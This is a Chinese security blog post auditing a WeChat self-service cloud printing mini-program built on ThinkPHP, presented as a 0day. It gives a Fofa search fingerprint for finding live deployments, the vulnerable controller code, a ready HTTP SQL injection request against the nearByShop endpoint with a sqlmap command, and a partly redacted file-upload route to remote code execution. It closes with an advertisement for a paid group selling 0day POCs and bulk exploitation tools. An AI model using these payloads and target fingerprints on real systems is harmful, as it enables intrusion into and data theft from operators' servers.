#  (0day)某全新UI自助打印微信小程序系统SQL+RCE漏洞代码审计   
原创 Mstir  星悦安全   2024-11-16 04:37  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字关注我们 并设为  
星标  
## 0x00 前言  
  
**在数字化时代，打印服务的需求与日俱增。为了满足用户的便利需求，全新UI的自助打印系统/云打印小程序。**  
  
**全新UI设计：采用2024年最新的UI设计风格，界面简洁美观，用户体验极佳。**  
  
**云打印功能：支持用户通过小程序上传文件并进行云端打印，方便快捷。**  
  
**自助服务：用户可以自主选择打印参数，如打印份数、纸张类型等，实现真正的自助打印。**  
  
**多平台支持：源码支持微信小程序平台，方便用户在移动端进行操作。**  
  
**Fofa指纹:"未登录" && "/admin/login/index.html"**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5duuuJAFpJIFYqG1ffXXkRmpLI5AKHbcMk7tQAXzWfnOhKOg03ACURvxO4qtxdNVjw64VyzpGWU1g/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5duuuJAFpJIFYqG1ffXXkRmLib7MD3jLLyO8DoQ5V8nm7tUW9ibHZ7pVDPfsF9iarOaR3yMpptt4ibIAQ/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5duuuJAFpJIFYqG1ffXXkRmY5ic29Gia85nW5yUOgz0bLibeV3L4cduZhwbdfZR6DxR6Ot1EmNFjXTDw/640?wx_fmt=png&from=appmsg "")  
  
**框架:ThinkPHP 6.0.2 Debug:True**  
## 0x01 前台SQL注入漏洞  
  
**位于 /api/controller/Shop.php 控制器的nearByShop 方法通过传入latitude和longitude 来插入到SQL语句中，然后直接通过 Db::query() 进行查询，且未有过滤，导致漏洞产生.**  
```
public function nearByShop()
  {
    $latitude = input('param.latitude', '');
    $longitude = input('param.longitude', '');
    $sql = <<<EOT
      SELECT
      a.*,
      (
      6378.138 * 2 * asin(
      sqrt(
      pow(
      sin(
      (
      radians( a.lat ) - radians( $latitude)
      ) / 2
      ),
      2
      ) + cos( radians( a.lat ) ) * cos( radians( $latitude ) ) * pow(
      sin(
      (
      radians( a.lng ) - radians( $longitude )
      ) / 2
      ),
      2
      )
      )
      )
      ) AS distance
      FROM
      do_shop a
      HAVING distance < 300000
      ORDER BY
      distance
      LIMIT 10
      EOT;

    $data = Db::query($sql);

    $printer = [];
    if (!empty($data)) {
      foreach ($data as $v) {
        $shop_ids[] = $v['id'];
      }
      $where[] = [
        'shop_id',
        'in',
        $shop_ids,
        ];
      $printer = Db::table('do_printer')->where($where)->select();
      if (!empty($printer)) {
        foreach ($printer as $k => $v) {
          $v['business_hours'] = json_decode($v['business_hours'] ?? '[]', true);
          //$v['print'] = json_decode($v['print'] ?? '[]', true);
          $v['functions'] = json_decode($v['functions'] ?? '[]', true);

          foreach ($data as $shop) {
            if ($shop['id'] == $v['shop_id']) {
              $v['shop_name'] = $shop['name'];
              $v['distance'] = intval($shop['distance'] * 1000);
            }
          }

          $printer[$k] = $v;
        }
      }
    }

    $return = [
      'code' => 0,
      'data' => [
      'shop' => $data,
      'printer' => $printer,
      ],
      ];

    return json($return);
  }
```  
  
**Payload:**  
```
POST /api/shop/nearByShop HTTP/1.1
Content-Length: 104
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Host: 127.0.0.1:81
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Connection: close

latitude=1&longitude=GTID_SUBSET(CONCAT((MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,190))),9392)
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5duuuJAFpJIFYqG1ffXXkRmFenCTZdmkuTHmRap2icbhHAOoH2IX2o1anoWjc0u81f6kQCLSyqmzXA/640?wx_fmt=png&from=appmsg "")  
  
**python sqlmap.py -r a.txt --level=3 --dbms=mysql**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5duuuJAFpJIFYqG1ffXXkRmg2pv8vtZg6kicYj53OmOiaddoDlhgibRtExo5HT8luUm3IbTOZxpg4bbg/640?wx_fmt=png&from=appmsg "")  
## 0x02 前台任意文件上传漏洞(RCE)  
  
**位于 /xxxx/controller/xxxxx.php 控制器中的file方法通过file()函数获取文件，并通过 putFile() 函数 直接将文件写入到/sxxxxx/ 目录中，然后传入 proxxx=xxxxx 进入该分支即可得到上传文件的地址.**  
```
/**
* 处理上传文件.
*
* @return \think\response\Json
*/
public function xxxx()
{
    $file = request()->file('file');
    $page_type = input('param.page_type', 1, 'intval');
    $print_type = input('param.print_type', 1, 'intval');
    $filename = input('param.filename', $file->getOriginalName(), 'trim');
    $doc_type = input('param.doc_type', 1, 'intval');
    $printer_id = input('param.printer_id');
    //文件处理流程
    /**
         * 1.none 不处理
         * 2.id_card 身份证：不插入数据库，正反面都上传完成后，用户点击完成时合并图片，保存到打印列表
         * 3.c1 1寸照片
         * 4.c1x 大1寸照片
         * 5.c2
         * 6.c2x
         * 7.photo.
         */
    $process = input('param.process', 'none', 'trim');
    try {
      $savename = Filesystem::disk('public')->putFile('', $file);
      $root = config('filesystem.disks.public.root');
      $domain = config('filesystem.disks.public.url');
      switch ($process) {
        case 'xxx_xxxxx':
        $savename = Config::get('filesystem.disks.public.url').'/'.$savename;
        $return = [
          'code' => 0,
          'data' => ['savename' => $savename],
          ];
      } catch (ValidateException $e) {
      $return = [
        'code' => 1,
        'msg' => $e->getMessage(),
        ];
    }

    $return['printer_list'] = $this->printerList();

    return json($return);
  }
```  
  
**Payload:**  
```
POST /xxxx/xxxxx/xxxx HTTP/1.1
Host: 127.0.0.1
Content-Length: 298
Cache-Control: max-age=0
Origin: http://127.0.0.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXr8AJ9qGX4nSmcI0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Connection: close

完整EXP请见文末!完整EXP请见文末!完整EXP请见文末!
完整EXP请见文末!完整EXP请见文末!完整EXP请见文末!
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5duuuJAFpJIFYqG1ffXXkRmibBK0pAmbTpErGrhRvG9mvTLEyKE7mWhXHCjmMicmKPibslUYtTr0kvSg/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5duuuJAFpJIFYqG1ffXXkRmfKXbmbBSsLzObic4NjzhIYzRveXvwlmnG4vqBXn4aR8QSEic0Z5HoWXw/640?wx_fmt=jpeg "")  
## 0x03 纷传圈子介绍  
  
完整审计文章及源码放在纷传圈子里了  
  
**高质量漏洞利用研究，代码审计圈子，每周至少更新三个0Day/Nday及对应漏洞的批量利用工具，团队内部POC，源码分享，星球不定时更新内外网攻防渗透技巧以及最新学习，SRC研究报告等。**  
  
**【圈子权益】**  
  
**1，一年至少999+漏洞Poc及对应漏洞批量利用工具**  
  
**2，各种漏洞利用工具及后续更新，渗透工具、文档资源分享**  
  
**3，内部漏洞库情报分享（目前已有1700+poc，会每日更新，包括部分未公开0/1day）**  
  
**4，加入内部微信群，遇到任何技术问题都可以进行快速提问、讨论交流；**  
  
**圈子目前价格为40元，现在星球有500+位师傅相信并选择加入我们**  
  
****  
**网站源码及漏洞库已于11.5日更新**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5dO3JY3ibuSzzKb6JXHOsho87AiaLnO5SC57BIhrNmuPRmFKjPehD8FRjZTI1SXD6wEnbSJgujbCbbg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dPFicRheSpuSsBE8ZFeE6HwYQ7XZx91DUHD6M2jFjo9jwxZEnQs2PaU9jQAvYicVxtcIiaKI2QeRxqA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
****  
**圈子内部漏********洞库(日更)**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dO3JY3ibuSzzKb6JXHOsho8GllKEjcqXnSa6OY73aptxTiaibrLiaKrw85bDlFrRjR8aUGrxZKVQBTug/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**每篇文章均有完整指纹和详细POC**  
  
****  
**一起愉快地刷分**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ff43kUoicsmnll86ficaMcTp1nDJvFuhT6INWEyGaCkEEclfEo8Ld6OBOzzJ3BkTVbrfqd41XhAhicA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dPFicRheSpuSsBE8ZFeE6HwwvkuIIecPQwHta0wibQuCqoSTqsc2K1KZDpJb3enDibBiau4EEhxrTYxA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ff43kUoicsmnll86ficaMcTpt1uZwVAmW8XEscyvU51uc9sdiaHViaJKMEZyiaM4bAaQfGIPNd26u2A5w/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**上百套审计源码，包括各种协同办公OA**  
  
****  
**入圈之后可私信我帮你找源码，已开通各大源码站VIP**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ff43kUoicsmnll86ficaMcTpPGVahCuyNFFdRtlOyjb6Z1dj8LMnibicPickAJZQLpTzoBoUqy9Xun3tg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dbasJicXJDEOR85icHkfIda3gg2HpaWjW2MZN9KZdGzX99Ofl7SRETFA4TicFabIO2UGibSONn6bhXQw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
**PS:关注公众号，持续更新漏洞文章**  
  
  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
